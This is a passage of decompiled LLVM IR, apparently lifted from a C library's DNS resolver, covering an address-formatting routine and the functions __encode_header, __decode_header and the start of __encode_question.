  %v2_ebd8 = ptrtoint i32* %stack_var_-110 to i32
  store i32 %v2_ebd8, i32* @r4, align 4
  %v9_ec44 = icmp eq i32 %tmp, 65535
  store i32 0, i32* @r5, align 4
  %v7_ebe463 = icmp eq i32 %v0_ebe423, -1
  br label %dec_label_pc_ebe4

dec_label_pc_ebe4:                                ; preds = %bb49, %dec_label_pc_ec98
  %v7_ebe467 = phi i1 [ %v7_ebe463, %bb49 ], [ %v7_ebe4, %dec_label_pc_ec98 ]
  %v0_ec1066 = phi i32 [ 0, %bb49 ], [ %v1_ec98, %dec_label_pc_ec98 ]
  %v1_ec0065 = phi i32 [ %v0_ebe423, %bb49 ], [ %v0_ebe4.pre, %dec_label_pc_ec98 ]
  %v3_ec1864 = phi i32 [ %v2_ebd8, %bb49 ], [ %v3_ec0824, %dec_label_pc_ec98 ]
  br i1 %v7_ebe467, label %dec_label_pc_ec10, label %dec_label_pc_ebec

dec_label_pc_ebec:                                ; preds = %dec_label_pc_ebe4
  %v9_ebec = icmp eq i32 %v0_ec1066, %v1_ec0065
  %v5_ebf0 = icmp slt i32 %v0_ec1066, %v1_ec0065
  br i1 %v5_ebf0, label %dec_label_pc_ec10, label %dec_label_pc_ebf4

dec_label_pc_ebf4:                                ; preds = %dec_label_pc_ebec
  %v1_ebf4 = load i32, i32* @r7, align 4
  %v2_ebf4 = add i32 %v1_ebf4, %v1_ec0065
  %v6_ebfc = icmp slt i32 %v0_ec1066, %v2_ebf4
  br i1 %v6_ebfc, label %dec_label_pc_ec00, label %dec_label_pc_ec10

dec_label_pc_ec00:                                ; preds = %dec_label_pc_ebf4
  br i1 %v9_ebec, label %bb51, label %dec_label_pc_ec98

bb51:                                             ; preds = %dec_label_pc_ec00
  %v4_ec08 = inttoptr i32 %v3_ec1864 to i8*
  store i8 58, i8* %v4_ec08, align 1
  %v5_ec08 = load i32, i32* @r4, align 4
  %v6_ec08 = add i32 %v5_ec08, 1
  store i32 %v6_ec08, i32* @r4, align 4
  br label %dec_label_pc_ec98

dec_label_pc_ec10:                                ; preds = %dec_label_pc_ebf4, %dec_label_pc_ebec, %dec_label_pc_ebe4
  %v2_ec10 = icmp eq i32 %v0_ec1066, 0
  br i1 %v2_ec10, label %.thread3, label %bb52

bb52:                                             ; preds = %dec_label_pc_ec10
  %v4_ec18 = inttoptr i32 %v3_ec1864 to i8*
  store i8 58, i8* %v4_ec18, align 1
  %v5_ec18 = load i32, i32* @r4, align 4
  %v6_ec18 = add i32 %v5_ec18, 1
  store i32 %v6_ec18, i32* @r4, align 4
  %v0_ec1c.pre = load i32, i32* @r5, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_ec10, %bb52
  %v0_ec5c = phi i32 [ %v3_ec1864, %dec_label_pc_ec10 ], [ %v6_ec18, %bb52 ]
  %v1_ec80 = phi i32 [ 0, %dec_label_pc_ec10 ], [ %v0_ec1c.pre, %bb52 ]
  %v7_ec1c = icmp eq i32 %v1_ec80, 6
  br i1 %v7_ec1c, label %dec_label_pc_ec24, label %dec_label_pc_ec7c

dec_label_pc_ec24:                                ; preds = %.thread3
  %v0_ec24 = load i32, i32* @r6, align 4
  %v2_ec24 = icmp eq i32 %v0_ec24, 0
  br i1 %v2_ec24, label %dec_label_pc_ec2c, label %dec_label_pc_ec7c

dec_label_pc_ec2c:                                ; preds = %dec_label_pc_ec24
  %v0_ec2c = load i32, i32* @r7, align 4
  %v7_ec2c = icmp eq i32 %v0_ec2c, 6
  br i1 %v7_ec2c, label %dec_label_pc_ec4c, label %dec_label_pc_ec34

dec_label_pc_ec34:                                ; preds = %dec_label_pc_ec2c
  %v7_ec34 = icmp eq i32 %v0_ec2c, 5
  br i1 %v7_ec34, label %dec_label_pc_ec3c, label %dec_label_pc_ec7c

dec_label_pc_ec3c:                                ; preds = %dec_label_pc_ec34
  store i32 %tmp, i32* %r2.global-to-local, align 4
  br i1 %v9_ec44, label %dec_label_pc_ec4c, label %dec_label_pc_ec7c

dec_label_pc_ec4c:                                ; preds = %dec_label_pc_ec3c, %dec_label_pc_ec2c
  %v2_ec50 = sub i32 %v25_eabc, %v0_ec5c
  %v0_ec54 = load i32, i32* @r8, align 4
  %v1_ec54 = add i32 %v0_ec54, 12
  %v1_ec58 = add i32 %v2_ec50, -32
  store i32 %v1_ec58, i32* %r2.global-to-local, align 4
  store i32 %v0_ec5c, i32* %r1.global-to-local, align 4
  %v3_ec60 = call i32 @inet_ntop4(i32 %v1_ec54, i32 %v0_ec5c, i32 %v1_ec58)
  %v2_ec64 = icmp eq i32 %v3_ec60, 0
  br i1 %v2_ec64, label %dec_label_pc_ecf0, label %dec_label_pc_ec6c

dec_label_pc_ec6c:                                ; preds = %dec_label_pc_ec4c
  %v0_ec6c = load i32, i32* @r4, align 4
  %v1_ec6c = inttoptr i32 %v0_ec6c to i8*
  %v3_ec70 = call i32 @strlen(i8* %v1_ec6c)
  %v0_ec74 = load i32, i32* @r4, align 4
  %v2_ec74 = add i32 %v0_ec74, %v3_ec70
  store i32 %v2_ec74, i32* @r4, align 4
  %v0_ecac.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_ecac

dec_label_pc_ec7c:                                ; preds = %dec_label_pc_ec3c, %dec_label_pc_ec34, %dec_label_pc_ec24, %.thread3
  %v4_ec80 = mul i32 %v1_ec80, 4
  %v5_ec80 = add i32 %v4_ec80, %v25_eabc
  store i32 %v0_ec5c, i32* @r0, align 4
  %v1_ec88 = add i32 %v5_ec80, -32
  %v2_ec88 = inttoptr i32 %v1_ec88 to i32*
  %v3_ec88 = load i32, i32* %v2_ec88, align 4
  store i32 %v3_ec88, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1254c.341 to i32), i32* %r1.global-to-local, align 4
  %v5_ec90 = call i32 @sprintf(i32 %v0_ec5c, i32 ptrtoint ([3 x i8]* @global_var_1254c.341 to i32), i32 %v3_ec88, i32 %v5_ec80)
  %v0_ec94 = load i32, i32* @r4, align 4
  %v2_ec94 = add i32 %v0_ec94, %v5_ec90
  store i32 %v2_ec94, i32* @r4, align 4
  br label %dec_label_pc_ec98

dec_label_pc_ec98:                                ; preds = %dec_label_pc_ec00, %bb51, %dec_label_pc_ec7c
  %v3_ec0824 = phi i32 [ %v3_ec1864, %dec_label_pc_ec00 ], [ %v6_ec08, %bb51 ], [ %v2_ec94, %dec_label_pc_ec7c ]
  %v0_ec98 = load i32, i32* @r5, align 4
  %v1_ec98 = add i32 %v0_ec98, 1
  %v0_ebe4.pre = load i32, i32* @r6, align 4
  store i32 %v1_ec98, i32* @r5, align 4
  %v7_eca0 = icmp slt i32 %v1_ec98, 8
  %v7_ebe4 = icmp eq i32 %v0_ebe4.pre, -1
  br i1 %v7_eca0, label %dec_label_pc_ebe4, label %dec_label_pc_eca4

dec_label_pc_eca4:                                ; preds = %dec_label_pc_ec98
  br i1 %v7_ebe4, label %.thread4, label %dec_label_pc_ecac

dec_label_pc_ecac:                                ; preds = %dec_label_pc_eca4, %dec_label_pc_ec6c
  %v3_ecb8 = phi i32 [ %v3_ec0824, %dec_label_pc_eca4 ], [ %v2_ec74, %dec_label_pc_ec6c ]
  %v0_ecac = phi i32 [ %v0_ebe4.pre, %dec_label_pc_eca4 ], [ %v0_ecac.pre, %dec_label_pc_ec6c ]
  %v1_ecac = load i32, i32* @r7, align 4
  %v2_ecac = add i32 %v1_ecac, %v0_ecac
  %v7_ecb0 = icmp eq i32 %v2_ecac, 8
  br i1 %v7_ecb0, label %bb53, label %.thread4

bb53:                                             ; preds = %dec_label_pc_ecac
  %v4_ecb8 = inttoptr i32 %v3_ecb8 to i8*
  store i8 58, i8* %v4_ecb8, align 1
  %v5_ecb8 = load i32, i32* @r4, align 4
  %v6_ecb8 = add i32 %v5_ecb8, 1
  store i32 %v6_ecb8, i32* @r4, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_ecac, %dec_label_pc_eca4, %bb53
  %v2_ecc0 = phi i32 [ %v3_ecb8, %dec_label_pc_ecac ], [ %v3_ec0824, %dec_label_pc_eca4 ], [ %v6_ecb8, %bb53 ]
  store i32 0, i32* %r5.global-to-local, align 4
  %v3_ecc0 = inttoptr i32 %v2_ecc0 to i8*
  store i8 0, i8* %v3_ecc0, align 1
  %v4_ecc0 = load i32, i32* @r4, align 4
  %v5_ecc0 = add i32 %v4_ecc0, 1
  store i32 %v2_ebd8, i32* %r1.global-to-local, align 4
  %v2_ecc8 = sub i32 %v5_ecc0, %v2_ebd8
  %v1_eccc = load i32, i32* @sl, align 4
  %tmp69 = icmp ugt i32 %v2_ecc8, %v1_eccc
  br i1 %tmp69, label %dec_label_pc_ecd4, label %dec_label_pc_ece8

dec_label_pc_ecd4:                                ; preds = %.thread4
  %v0_ecd4 = call i32 @__errno_location()
  %v0_ecdc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_ecdc, i32* %r2.global-to-local, align 4
  %v2_ece0 = inttoptr i32 %v0_ecd4 to i32*
  store i32 28, i32* %v2_ece0, align 4
  %v0_ed08.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ed08

dec_label_pc_ece8:                                ; preds = %.thread4
  %v0_ece8 = load i32, i32* @sb, align 4
  %v2_ecec = bitcast i32* %stack_var_-110 to i8*
  %v3_ecec = call i32 @strcpy(i32 %v0_ece8, i8* %v2_ecec)
  br label %dec_label_pc_ecf0

dec_label_pc_ecf0:                                ; preds = %dec_label_pc_ec4c, %dec_label_pc_eae4, %dec_label_pc_ece8
  %v0_ecf0 = phi i32 [ 0, %dec_label_pc_ec4c ], [ %v3_eaf0, %dec_label_pc_eae4 ], [ %v3_ecec, %dec_label_pc_ece8 ]
  store i32 %v0_ecf0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ed08

dec_label_pc_ecf8:                                ; preds = %dec_label_pc_ead8
  %v0_ecf8 = call i32 @__errno_location()
  %v2_ed00 = inttoptr i32 %v0_ecf8 to i32*
  store i32 97, i32* %v2_ed00, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ed08

dec_label_pc_ed08:                                ; preds = %dec_label_pc_ecf0, %dec_label_pc_ecd4, %dec_label_pc_ecf8
  %v0_ed08 = phi i32 [ %v0_ecf0, %dec_label_pc_ecf0 ], [ %v0_ed08.pre, %dec_label_pc_ecd4 ], [ 0, %dec_label_pc_ecf8 ]
  store i32 %v6_eabc, i32* %r5.global-to-local, align 4
  ret i32 %v0_ed08

; uselistorder directives
  uselistorder i1 %v7_ebe4, { 1, 0 }
  uselistorder i32 %v0_ebe4.pre, { 1, 0, 2 }
  uselistorder i32 %v1_ec98, { 1, 0, 2 }
  uselistorder i32 %v0_ec5c, { 4, 3, 1, 0, 2 }
  uselistorder i32 %v3_ec1864, { 0, 3, 2, 1 }
  uselistorder i32 %v1_ec0065, { 2, 0, 1 }
  uselistorder i32 %v0_ec1066, { 3, 2, 0, 1 }
  uselistorder i32 %v2_ebd8, { 2, 1, 0, 3 }
  uselistorder i32 %v0_ebe423, { 1, 0 }
  uselistorder i32 %v0_ebc8, { 1, 2, 0 }
  uselistorder i32 %v1_eb9c, { 1, 2, 0 }
  uselistorder i32 %v0_ebb0, { 1, 2, 0, 3 }
  uselistorder i32 %v0_ebc4, { 1, 2, 0, 3 }
  uselistorder i1 %v7_eb64, { 1, 0 }
  uselistorder i32 %v0_eb9c, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_eb80, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_eb90, { 3, 1, 0, 2 }
  uselistorder i32 %v2_eb34, { 2, 1, 0 }
  uselistorder i32 %v1_eb14, { 3, 1, 4, 0, 2 }
  uselistorder i32 %v25_eabc, { 0, 3, 1, 2 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 13, 0 }
  uselistorder i32* %r1.global-to-local, { 3, 4, 5, 6, 7, 2, 1, 8, 9, 0 }
  uselistorder i8 58, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 (i32, i32, i32)* @inet_ntop4, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0, 2 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_ed08, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ecf0, { 2, 0, 1 }
  uselistorder label %.thread4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ec98, { 2, 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_ebe4, { 1, 0 }
  uselistorder label %bb49, { 2, 1, 0 }
  uselistorder label %dec_label_pc_ebc8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ebc0, { 1, 0 }
  uselistorder label %dec_label_pc_eb9c, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_eb98, { 1, 0 }
  uselistorder label %dec_label_pc_eb50, { 1, 0 }
  uselistorder label %dec_label_pc_eb24, { 1, 0 }
}

define i32 @__encode_header(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-8 = alloca i32, align 4
  %v3_ed20 = load i32, i32* @r4, align 4
  store i32 %v3_ed20, i32* %stack_var_-8, align 4
  store i32 %tmp, i32* %lr.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v7_ed30 = icmp sgt i32 %arg3, 11
  br i1 %v7_ed30, label %dec_label_pc_ed34, label %dec_label_pc_edfc

dec_label_pc_ed34:                                ; preds = %entry
  %tmp18 = inttoptr i32 %arg2 to i8*
  %v1_ed34 = add i32 %tmp, 1
  %v2_ed34 = inttoptr i32 %v1_ed34 to i8*
  %v3_ed34 = load i8, i8* %v2_ed34, align 1
  store i8 %v3_ed34, i8* %tmp18, align 1
  %v2_ed3c = load i32, i32* %arg1, align 4
  %v1_ed40 = trunc i32 %v2_ed3c to i8
  %v4_ed40 = add i32 %arg2, 1
  %v5_ed40 = inttoptr i32 %v4_ed40 to i8*
  store i8 %v1_ed40, i8* %v5_ed40, align 1
  %v0_ed44 = load i32, i32* %lr.global-to-local, align 4
  %v1_ed44 = add i32 %v0_ed44, 12
  %v2_ed44 = inttoptr i32 %v1_ed44 to i32*
  %v3_ed44 = load i32, i32* %v2_ed44, align 4
  %v1_ed48 = add i32 %v0_ed44, 4
  %v2_ed48 = inttoptr i32 %v1_ed48 to i32*
  %v3_ed48 = load i32, i32* %v2_ed48, align 4
  %v1_ed4c = add i32 %v0_ed44, 16
  %v2_ed4c = inttoptr i32 %v1_ed4c to i32*
  %v3_ed4c = load i32, i32* %v2_ed4c, align 4
  %v1_ed50 = add i32 %tmp, 8
  %v2_ed50 = inttoptr i32 %v1_ed50 to i32*
  %v3_ed50 = load i32, i32* %v2_ed50, align 4
  %v2_ed54 = icmp eq i32 %v3_ed44, 0
  %. = select i1 %v2_ed54, i32 0, i32 4
  %v2_ed60 = icmp eq i32 %v3_ed48, 0
  %v1_ed64 = add i32 %v0_ed44, 20
  %v2_ed64 = inttoptr i32 %v1_ed64 to i32*
  %v3_ed64 = load i32, i32* %v2_ed64, align 4
  %storemerge12 = select i1 %v2_ed60, i32 0, i32 128
  %v1_ed70 = urem i32 %v3_ed50, 16
  %v2_ed74 = icmp eq i32 %v3_ed4c, 0
  %.29 = select i1 %v2_ed74, i32 0, i32 2
  %v4_ed80 = mul nuw nsw i32 %v1_ed70, 8
  %v5_ed80 = or i32 %v4_ed80, %.
  %v2_ed84 = icmp eq i32 %v3_ed64, 0
  br i1 %v2_ed84, label %bb26, label %bb25

bb25:                                             ; preds = %dec_label_pc_ed34
  %v2_ed88 = or i32 %v5_ed80, 1
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_ed34, %bb25
  %v1_ed90 = phi i32 [ %v5_ed80, %dec_label_pc_ed34 ], [ %v2_ed88, %bb25 ]
  %v2_ed8c = or i32 %.29, %storemerge12
  %v2_ed90 = or i32 %v2_ed8c, %v1_ed90
  %v1_ed94 = trunc i32 %v2_ed90 to i8
  %v2_ed94 = load i32, i32* %r4.global-to-local, align 4
  %v3_ed94 = add i32 %v2_ed94, 2
  %v4_ed94 = inttoptr i32 %v3_ed94 to i8*
  store i8 %v1_ed94, i8* %v4_ed94, align 1
  %v0_ed98 = load i32, i32* %lr.global-to-local, align 4
  %v1_ed98 = add i32 %v0_ed98, 24
  %v1_ed9c = inttoptr i32 %v1_ed98 to i32*
  %v2_ed9c = load i32, i32* %v1_ed9c, align 4
  %v3_ed9c = add i32 %v0_ed98, 28
  %v4_ed9c = inttoptr i32 %v3_ed9c to i32*
  %v5_ed9c = load i32, i32* %v4_ed9c, align 4
  %v2_eda0 = icmp eq i32 %v2_ed9c, 0
  %v1_eda4 = urem i32 %v5_ed9c, 16
  %.30 = select i1 %v2_eda0, i32 0, i32 128
  %v2_edb0 = or i32 %v1_eda4, %.30
  %v1_edb4 = trunc i32 %v2_edb0 to i8
  %v2_edb4 = load i32, i32* %r4.global-to-local, align 4
  %v3_edb4 = add i32 %v2_edb4, 3
  %v4_edb4 = inttoptr i32 %v3_edb4 to i8*
  store i8 %v1_edb4, i8* %v4_edb4, align 1
  %v0_edb8 = load i32, i32* %lr.global-to-local, align 4
  %v1_edb8 = add i32 %v0_edb8, 33
  %v2_edb8 = inttoptr i32 %v1_edb8 to i8*
  %v3_edb8 = load i8, i8* %v2_edb8, align 1
  %v2_edbc = load i32, i32* %r4.global-to-local, align 4
  %v3_edbc = add i32 %v2_edbc, 4
  %v4_edbc = inttoptr i32 %v3_edbc to i8*
  store i8 %v3_edb8, i8* %v4_edbc, align 1
  %v0_edc0 = load i32, i32* %lr.global-to-local, align 4
  %v1_edc0 = add i32 %v0_edc0, 32
  %v2_edc0 = inttoptr i32 %v1_edc0 to i32*
  %v3_edc0 = load i32, i32* %v2_edc0, align 4
  %v1_edc4 = trunc i32 %v3_edc0 to i8
  %v2_edc4 = load i32, i32* %r4.global-to-local, align 4
  %v3_edc4 = add i32 %v2_edc4, 5
  %v4_edc4 = inttoptr i32 %v3_edc4 to i8*
  store i8 %v1_edc4, i8* %v4_edc4, align 1
  %v0_edc8 = load i32, i32* %lr.global-to-local, align 4
  %v1_edc8 = add i32 %v0_edc8, 37
  %v2_edc8 = inttoptr i32 %v1_edc8 to i8*
  %v3_edc8 = load i8, i8* %v2_edc8, align 1
  %v2_edcc = load i32, i32* %r4.global-to-local, align 4
  %v3_edcc = add i32 %v2_edcc, 6
  %v4_edcc = inttoptr i32 %v3_edcc to i8*
  store i8 %v3_edc8, i8* %v4_edcc, align 1
  %v0_edd0 = load i32, i32* %lr.global-to-local, align 4
  %v1_edd0 = add i32 %v0_edd0, 36
  %v2_edd0 = inttoptr i32 %v1_edd0 to i32*
  %v3_edd0 = load i32, i32* %v2_edd0, align 4
  %v1_edd4 = trunc i32 %v3_edd0 to i8
  %v2_edd4 = load i32, i32* %r4.global-to-local, align 4
  %v3_edd4 = add i32 %v2_edd4, 7
  %v4_edd4 = inttoptr i32 %v3_edd4 to i8*
  store i8 %v1_edd4, i8* %v4_edd4, align 1
  %v0_edd8 = load i32, i32* %lr.global-to-local, align 4
  %v1_edd8 = add i32 %v0_edd8, 41
  %v2_edd8 = inttoptr i32 %v1_edd8 to i8*
  %v3_edd8 = load i8, i8* %v2_edd8, align 1
  %v2_eddc = load i32, i32* %r4.global-to-local, align 4
  %v3_eddc = add i32 %v2_eddc, 8
  %v4_eddc = inttoptr i32 %v3_eddc to i8*
  store i8 %v3_edd8, i8* %v4_eddc, align 1
  %v0_ede0 = load i32, i32* %lr.global-to-local, align 4
  %v1_ede0 = add i32 %v0_ede0, 40
  %v2_ede0 = inttoptr i32 %v1_ede0 to i32*
  %v3_ede0 = load i32, i32* %v2_ede0, align 4
  %v1_ede4 = trunc i32 %v3_ede0 to i8
  %v2_ede4 = load i32, i32* %r4.global-to-local, align 4
  %v3_ede4 = add i32 %v2_ede4, 9
  %v4_ede4 = inttoptr i32 %v3_ede4 to i8*
  store i8 %v1_ede4, i8* %v4_ede4, align 1
  %v0_ede8 = load i32, i32* %lr.global-to-local, align 4
  %v1_ede8 = add i32 %v0_ede8, 45
  %v2_ede8 = inttoptr i32 %v1_ede8 to i8*
  %v3_ede8 = load i8, i8* %v2_ede8, align 1
  %v2_edec = load i32, i32* %r4.global-to-local, align 4
  %v3_edec = add i32 %v2_edec, 10
  %v4_edec = inttoptr i32 %v3_edec to i8*
  store i8 %v3_ede8, i8* %v4_edec, align 1
  %v0_edf0 = load i32, i32* %lr.global-to-local, align 4
  %v1_edf0 = add i32 %v0_edf0, 44
  %v2_edf0 = inttoptr i32 %v1_edf0 to i32*
  %v3_edf0 = load i32, i32* %v2_edf0, align 4
  %v1_edf4 = trunc i32 %v3_edf0 to i8
  %v2_edf4 = load i32, i32* %r4.global-to-local, align 4
  %v3_edf4 = add i32 %v2_edf4, 11
  %v4_edf4 = inttoptr i32 %v3_edf4 to i8*
  store i8 %v1_edf4, i8* %v4_edf4, align 1
  %v2_ee00.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_edfc

dec_label_pc_edfc:                                ; preds = %entry, %bb26
  %v2_ee00 = phi i32 [ %v3_ed20, %entry ], [ %v2_ee00.pre, %bb26 ]
  %v0_edfc = phi i32 [ -1, %entry ], [ 12, %bb26 ]
  store i32 %v2_ee00, i32* @r4, align 4
  ret i32 %v0_edfc

; uselistorder directives
  uselistorder i32 %tmp, { 0, 2, 1 }
  uselistorder i32 45, { 1, 0 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_edfc, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
}

define i32 @__decode_header(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_ee04 = load i8, i8* %arg1, align 1
  %v4_ee04 = zext i8 %v3_ee04 to i32
  %v2_ee08 = add i32 %tmp, 1
  %v3_ee08 = inttoptr i32 %v2_ee08 to i8*
  %v4_ee08 = load i8, i8* %v3_ee08, align 1
  %v5_ee08 = zext i8 %v4_ee08 to i32
  %v4_ee0c = mul nuw nsw i32 %v4_ee04, 256
  %v5_ee0c = or i32 %v5_ee08, %v4_ee0c
  %v2_ee10 = inttoptr i32 %arg2 to i32*
  store i32 %v5_ee0c, i32* %v2_ee10, align 4
  %v2_ee14 = add i32 %tmp, 2
  %v3_ee14 = inttoptr i32 %v2_ee14 to i8*
  %v4_ee14 = load i8, i8* %v3_ee14, align 1
  %tmp4 = icmp slt i8 %v4_ee14, 0
  %v3_ee18 = zext i1 %tmp4 to i32
  %v2_ee1c = add i32 %arg2, 4
  %v3_ee1c = inttoptr i32 %v2_ee1c to i32*
  store i32 %v3_ee18, i32* %v3_ee1c, align 4
  %v4_ee20 = load i8, i8* %v3_ee14, align 1
  %div = udiv i8 %v4_ee20, 8
  %tmp5 = urem i8 %div, 16
  %v1_ee28 = zext i8 %tmp5 to i32
  %v2_ee2c = add i32 %arg2, 8
  %v3_ee2c = inttoptr i32 %v2_ee2c to i32*
  store i32 %v1_ee28, i32* %v3_ee2c, align 4
  %v4_ee30 = load i8, i8* %v3_ee14, align 1
  %div1 = udiv i8 %v4_ee30, 4
  %tmp6 = urem i8 %div1, 2
  %v1_ee38 = zext i8 %tmp6 to i32
  %v2_ee3c = add i32 %arg2, 12
  %v3_ee3c = inttoptr i32 %v2_ee3c to i32*
  store i32 %v1_ee38, i32* %v3_ee3c, align 4
  %v4_ee40 = load i8, i8* %v3_ee14, align 1
  %div2 = udiv i8 %v4_ee40, 2
  %tmp7 = urem i8 %div2, 2
  %v1_ee48 = zext i8 %tmp7 to i32
  %v2_ee4c = add i32 %arg2, 16
  %v3_ee4c = inttoptr i32 %v2_ee4c to i32*
  store i32 %v1_ee48, i32* %v3_ee4c, align 4
  %v4_ee50 = load i8, i8* %v3_ee14, align 1
  %tmp8 = urem i8 %v4_ee50, 2
  %v1_ee54 = zext i8 %tmp8 to i32
  %v2_ee58 = add i32 %arg2, 20
  %v3_ee58 = inttoptr i32 %v2_ee58 to i32*
  store i32 %v1_ee54, i32* %v3_ee58, align 4
  %v2_ee5c = add i32 %tmp, 3
  %v3_ee5c = inttoptr i32 %v2_ee5c to i8*
  %v4_ee5c = load i8, i8* %v3_ee5c, align 1
  %tmp9 = icmp slt i8 %v4_ee5c, 0
  %v3_ee60 = zext i1 %tmp9 to i32
  %v2_ee64 = add i32 %arg2, 24
  %v3_ee64 = inttoptr i32 %v2_ee64 to i32*
  store i32 %v3_ee60, i32* %v3_ee64, align 4
  %v4_ee68 = load i8, i8* %v3_ee5c, align 1
  %tmp10 = urem i8 %v4_ee68, 16
  %v1_ee6c = zext i8 %tmp10 to i32
  %v2_ee70 = add i32 %arg2, 28
  %v3_ee70 = inttoptr i32 %v2_ee70 to i32*
  store i32 %v1_ee6c, i32* %v3_ee70, align 4
  %v2_ee74 = add i32 %tmp, 4
  %v3_ee74 = inttoptr i32 %v2_ee74 to i8*
  %v4_ee74 = load i8, i8* %v3_ee74, align 1
  %v5_ee74 = zext i8 %v4_ee74 to i32
  %v2_ee78 = add i32 %tmp, 5
  %v3_ee78 = inttoptr i32 %v2_ee78 to i8*
  %v4_ee78 = load i8, i8* %v3_ee78, align 1
  %v5_ee78 = zext i8 %v4_ee78 to i32
  %v4_ee7c = mul nuw nsw i32 %v5_ee74, 256
  %v5_ee7c = or i32 %v5_ee78, %v4_ee7c
  %v2_ee80 = add i32 %arg2, 32
  %v3_ee80 = inttoptr i32 %v2_ee80 to i32*
  store i32 %v5_ee7c, i32* %v3_ee80, align 4
  %v2_ee84 = add i32 %tmp, 6
  %v3_ee84 = inttoptr i32 %v2_ee84 to i8*
  %v4_ee84 = load i8, i8* %v3_ee84, align 1
  %v5_ee84 = zext i8 %v4_ee84 to i32
  %v2_ee88 = add i32 %tmp, 7
  %v3_ee88 = inttoptr i32 %v2_ee88 to i8*
  %v4_ee88 = load i8, i8* %v3_ee88, align 1
  %v5_ee88 = zext i8 %v4_ee88 to i32
  %v4_ee8c = mul nuw nsw i32 %v5_ee84, 256
  %v5_ee8c = or i32 %v5_ee88, %v4_ee8c
  %v2_ee90 = add i32 %arg2, 36
  %v3_ee90 = inttoptr i32 %v2_ee90 to i32*
  store i32 %v5_ee8c, i32* %v3_ee90, align 4
  %v2_ee94 = add i32 %tmp, 8
  %v3_ee94 = inttoptr i32 %v2_ee94 to i8*
  %v4_ee94 = load i8, i8* %v3_ee94, align 1
  %v5_ee94 = zext i8 %v4_ee94 to i32
  %v2_ee98 = add i32 %tmp, 9
  %v3_ee98 = inttoptr i32 %v2_ee98 to i8*
  %v4_ee98 = load i8, i8* %v3_ee98, align 1
  %v5_ee98 = zext i8 %v4_ee98 to i32
  %v4_ee9c = mul nuw nsw i32 %v5_ee94, 256
  %v5_ee9c = or i32 %v5_ee98, %v4_ee9c
  %v2_eea0 = add i32 %arg2, 40
  %v3_eea0 = inttoptr i32 %v2_eea0 to i32*
  store i32 %v5_ee9c, i32* %v3_eea0, align 4
  %v2_eea4 = add i32 %tmp, 11
  %v3_eea4 = inttoptr i32 %v2_eea4 to i8*
  %v4_eea4 = load i8, i8* %v3_eea4, align 1
  %v5_eea4 = zext i8 %v4_eea4 to i32
  %v2_eea8 = add i32 %tmp, 10
  %v3_eea8 = inttoptr i32 %v2_eea8 to i8*
  %v4_eea8 = load i8, i8* %v3_eea8, align 1
  %v5_eea8 = zext i8 %v4_eea8 to i32
  %v4_eeb0 = mul nuw nsw i32 %v5_eea8, 256
  %v5_eeb0 = or i32 %v4_eeb0, %v5_eea4
  %v2_eeb4 = add i32 %arg2, 44
  %v3_eeb4 = inttoptr i32 %v2_eeb4 to i32*
  store i32 %v5_eeb0, i32* %v3_eeb4, align 4
  ret i32 12

; uselistorder directives
  uselistorder i8 8, { 2, 0, 1, 3 }
  uselistorder i32 %arg2, { 3, 0, 8, 1, 6, 2, 10, 11, 7, 9, 4, 5 }
}

define i32 @__encode_question(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r2, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_eebc = load i32, i32* @r4, align 4
  store i32 %v3_eebc, i32* %stack_var_-16, align 4
  %v6_eebc = load i32, i32* @r5, align 4
  %v9_eebc = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_eec4 = load i32, i32* %arg1, align 4
  store i32 %v2_eec4, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  %v1_eed0 = inttoptr i32 %v2_eec4 to i8*
  %v2_eed0 = call i32 @__encode_dotted(i8* %v1_eed0)
  store i32 %v2_eed0, i32* %r0.global-to-local, align 4
  %v1_eed4 = icmp slt i32 %v2_eed0, 0
  br i1 %v1_eed4, label %bb, label %bb6

bb:                                               ; preds = %entry
  %v5_eedc = load i32, i32* %stack_var_-16, align 4
  store i32 %v5_eedc, i32* @r4, align 4
  store i32 %v6_eebc, i32* @r5, align 4
  store i32 %v9_eebc, i32* @r6, align 4
  ret i32 %v2_eed0

bb6:                                              ; preds = %entry
